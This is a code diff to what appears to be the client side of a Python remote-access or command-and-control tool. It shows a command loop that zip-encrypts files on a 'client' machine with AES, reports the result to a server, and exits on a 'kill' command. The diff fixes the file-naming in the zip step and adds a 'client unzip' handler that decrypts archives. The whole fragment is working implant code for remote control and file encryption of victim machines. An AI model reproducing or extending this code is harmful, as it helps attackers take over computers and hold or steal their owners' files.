@@ -116,11 +116,23 @@ while True:
                 if path.isdir(filepath):
                     post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n") # v1.0 of zipper
                 else:
-                    zip_file.write(filepath)
+                    zip_file.write(filepath, filename)
                     post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
+    elif cmd.startswith('client unzip'):
+        filepath = get_third_item(cmd)
+        if filepath is None: #IndexError / start new iteration
+            continue
+        filename = path.basename(filepath)
+        try:
+            with AESZipFile(filepath) as zip_file:
+                zip_file.setpassword(ZIP_PASSWORD)
+                zip_file.extractall(path.dirname(filename))
+                post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"{filepath} was not found on the client.\n")
     elif cmd.startswith('client kill'): # kill command
         post_to_server(f"{client} has been killed.\n")
         exit()
